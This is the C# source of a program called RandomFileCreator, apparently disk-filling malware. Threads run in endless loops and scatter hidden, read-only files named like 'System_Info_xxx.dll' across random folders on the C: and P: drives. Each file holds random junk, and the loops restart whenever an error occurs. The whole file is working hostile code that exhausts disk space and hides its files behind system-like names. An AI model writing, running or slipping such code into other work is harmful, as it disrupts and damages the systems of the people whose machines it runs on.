using System;
using System.IO;
using System.Text;
using System.Threading;

namespace RandomFileCreator
{
    class Program
    {
        public static Random random = new Random();
        public const int threads = 4;

        static void Main(string[] args)
        {
            if (Directory.Exists("P:\\"))
            {
                RunThreads(threads, "P:\\");
            }
            else
            {
                RunThreads(threads / 2, "c:\\");
            }
            RunThreads(threads / 2 + threads % 2, "c:\\");
        }

        public static void RunThreads(int threads, string path)
        {
            Thread[] thrs = new Thread[threads];
            for (int i = 0; i < threads; i++)
            {
                thrs[i] = new Thread(Run);
                thrs[i].Start(path);
            }
        }

        public static void Run(object path2)
        {
            try
            {
                while (true)
                {
                    string path = RandomPath((string)path2) + "\\" + "System_Info_" + RandomName() + ".dll";
                    using (StreamWriter sw = new StreamWriter(path, true))
                    {
                        File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
                        File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.ReadOnly);
                        for (int i = 0; i < random.Next(50, 100000); i++)
                        {
                            int c = random.Next(0, 1114112);
                            sw.Write((char)c);
                        }
                    }
                }
            }
            catch (Exception)
            {
                Run((string)path2);
                return;
            }
        }
        public static string RandomPath(string path)
        {
            try
            {
                string[] names = Directory.GetDirectories(path);
                if (names.Length == 0)
                {
                    return path;
                }
                int rand = random.Next(0, names.Length - 1);
                return RandomPath(names[rand]);
            }
            catch (UnauthorizedAccessException)
            {
                return path;
            }
        }
        public static string RandomName(string str = "")
        {
            if (str.Length == 18)
            {
                return str;
            }
            int rand = random.Next(1, 3) == 1 ? random.Next(48, 57) : random.Next(97, 122);
            return RandomName(str + ((char)rand));
        }

    }
}